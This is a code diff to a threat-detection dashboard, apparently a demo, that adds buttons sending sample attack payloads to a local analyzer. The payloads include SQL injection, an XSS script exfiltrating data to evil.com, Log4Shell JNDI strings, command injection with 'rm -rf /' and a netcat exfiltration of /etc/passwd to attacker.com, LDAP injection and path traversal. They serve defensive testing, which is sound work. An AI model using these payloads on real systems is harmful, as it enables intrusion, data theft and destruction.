@@ -189,8 +189,8 @@
                 <div class="metric-value" id="totalAnalyzed">0</div>
             </div>
             <div class="metric">
-                <div class="metric-label">Threats Blocked</div>
-                <div class="metric-value" id="threatsBlocked" style="color: #ff4444;">0</div>
+                <div class="metric-label">Test Attacks / Blocked</div>
+                <div class="metric-value" id="threatsBlocked" style="color: #ff4444;">0/0</div>
             </div>
             <div class="metric">
                 <div class="metric-label">Avg Confidence</div>
@@ -270,6 +270,21 @@
                         <button class="button warning" onclick="sendAttack('path')">
                             📁 Path Traversal
                         </button>
+                        <button class="button danger" onclick="sendAttack('cmd_injection')">
+                            💥 Command Injection
+                        </button>
+                        <button class="button warning" onclick="sendAttack('ldap_injection')">
+                            🔐 LDAP Injection
+                        </button>
+                        <button class="button danger" onclick="sendAttack('business_logic')">
+                            💰 Business Logic Attack
+                        </button>
+                        <button class="button danger" onclick="sendAttack('ransomware_c2')">
+                            🦠 Ransomware C2
+                        </button>
+                        <button class="button warning" onclick="sendAttack('supply_chain')">
+                            📦 Supply Chain Attack
+                        </button>
                         <button class="button" onclick="sendAttack('zero')">
                             🎯 Zero-Day Pattern
                         </button>
@@ -296,9 +311,12 @@
         let metrics = {
             total: 0,
             blocked: 0,
+            testAttacks: 0,
             confidence: 0,
             processing: 0
         };
+        
+        let isTestAttack = false;
 
         function connect() {
             ws = new WebSocket('ws://localhost:18002/ws');
@@ -342,7 +360,14 @@
             
             // Update metrics with null checks
             metrics.total++;
-            if ((data.threat_score || 0) > 0.7) metrics.blocked++;
+            
+            // Distinguish between test attacks and actual blocked threats
+            if (isTestAttack) {
+                metrics.testAttacks++;
+                isTestAttack = false; // Reset flag
+            } else if ((data.threat_score || 0) > 0.7) {
+                metrics.blocked++;
+            }
             
             const confidence = data.confidence || 0;
             const processingTime = data.processing_time_ms || (data.processing_time ? data.processing_time * 1000 : 0);
@@ -355,7 +380,7 @@
             }
             
             document.getElementById('totalAnalyzed').textContent = metrics.total;
-            document.getElementById('threatsBlocked').textContent = metrics.blocked;
+            document.getElementById('threatsBlocked').textContent = `${metrics.testAttacks}/${metrics.blocked}`;
             document.getElementById('avgConfidence').textContent = (metrics.confidence * 100).toFixed(1) + '%';
             document.getElementById('avgProcessing').textContent = metrics.processing.toFixed(0) + 'ms';
             
@@ -460,31 +485,69 @@
         }
 
         async function sendAttack(type) {
+            // Mark this as a test attack
+            isTestAttack = true;
             const attacks = {
                 sql: {
                     query: "id=1' OR '1'='1; DROP TABLE users;--",
                     path: "/api/users",
-                    method: "GET"
+                    method: "GET",
+                    body: "SELECT * FROM users WHERE id=1 UNION SELECT password FROM admin--"
                 },
                 xss: {
                     query: "&lt;script&gt;alert('XSS');document.cookie&lt;/script&gt;",
                     path: "/comment",
-                    method: "POST"
+                    method: "POST",
+                    body: "<script>fetch('/admin/users').then(r=>r.text()).then(d=>fetch('//evil.com/?'+btoa(d)))</script>"
                 },
                 path: {
                     query: "file=../../../../etc/passwd",
                     path: "/download",
-                    method: "GET"
+                    method: "GET",
+                    body: ""
                 },
                 zero: {
                     query: "\\${jndi:ldap://evil.com/exploit}",
                     path: "/api/log",
-                    method: "POST"
+                    method: "POST",
+                    body: "${jndi:ldap://attacker.com:1389/Exploit}"
                 },
                 normal: {
                     query: "page=1&limit=10&sort=date",
                     path: "/api/products",
-                    method: "GET"
+                    method: "GET",
+                    body: ""
+                },
+                // New Enterprise Attacks
+                cmd_injection: {
+                    query: "ping=127.0.0.1; rm -rf / #",
+                    path: "/api/ping",
+                    method: "POST",
+                    body: "; cat /etc/passwd | nc attacker.com 4444 &"
+                },
+                ldap_injection: {
+                    query: "user=admin')(&(password=*))",
+                    path: "/auth/ldap",
+                    method: "POST",
+                    body: "admin')(&(password=*)(|(objectClass=*)))"
+                },
+                business_logic: {
+                    query: "amount=-999999&to_account=attacker",
+                    path: "/api/transfer",
+                    method: "POST",
+                    body: '{"amount": -50000000, "from": "bank_reserves", "to": "attacker_account"}'
+                },
+                ransomware_c2: {
+                    query: "host_id=VICTIM-001&status=encrypted",
+                    path: "/api/callback",
+                    method: "POST",
+                    body: '{"victim_id": "BANK-001", "encryption_complete": true, "btc_address": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", "ransom_amount": "50000000"}'
+                },
+                supply_chain: {
+                    query: "package=@malicious/backdoor&version=latest",
+                    path: "/api/install",
+                    method: "POST",
+                    body: 'npm install compromised-package-with-crypto-miner'
                 }
             };
             
@@ -502,11 +565,12 @@
                             client_ip: '192.168.1.' + Math.floor(Math.random() * 255),
                             user_agent: type === 'normal' ? 'Mozilla/5.0' : 'AttackBot/1.0',
                             requests_per_minute: type === 'normal' ? 10 : 100,
-                            content_length: 0,
+                            content_length: (attack.body || attack.query || '').length,
                             query_param_count: 2,
                             header_count: 5,
                             hour_of_day: new Date().getHours(),
                             query: attack.query,
+                            body: attack.body || "",
                             headers: {}
                         },
                         context: {
